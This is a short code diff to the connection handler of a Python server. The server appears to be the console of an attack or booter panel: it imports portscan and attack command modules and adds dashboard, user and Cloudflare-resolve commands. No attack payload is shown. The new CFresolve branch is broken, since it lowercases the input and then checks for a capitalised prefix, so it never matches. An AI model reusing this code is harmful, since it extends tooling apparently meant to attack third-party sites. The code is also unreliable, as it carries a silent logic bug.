@@ -28,6 +28,7 @@ from assets.Commands.admin import *
 from assets.Commands.portscan import *
 from assets.Commands.attack import *
 from assets.Commands.main import *
+from assets.Commands.dash import *
 from netControl.get_usage import *
 
 # if utils.GetOS() == True:
@@ -88,7 +89,11 @@ def handle_connection(client, addr):
 
                 if data.lower() == "help" or data.lower() == "?":
                         client.send(str(BannerModify.GetBannerFromFile("help")).encode())
-                if "reslove" in data:
+                elif data.lower().startswith("dashboard"):
+                        dashboard_command(client, Current.CurrentCmd['args']) ##brb
+                elif data.lower() == "user":
+                        client.send(str(username + "\r\n").encode())
+                elif data.lower().startswith("CFresolve"):
                     cloudflare_resolve(client)
                 elif data.lower() == "clear" or data.lower() == "cls":
                         client.send(str(Strings.MainColors['Clear'] + CustomBannerMaker.CreateMOTD(utils.GetMOTD()) + BannerModify.GetBannerFromFile("main")).encode())
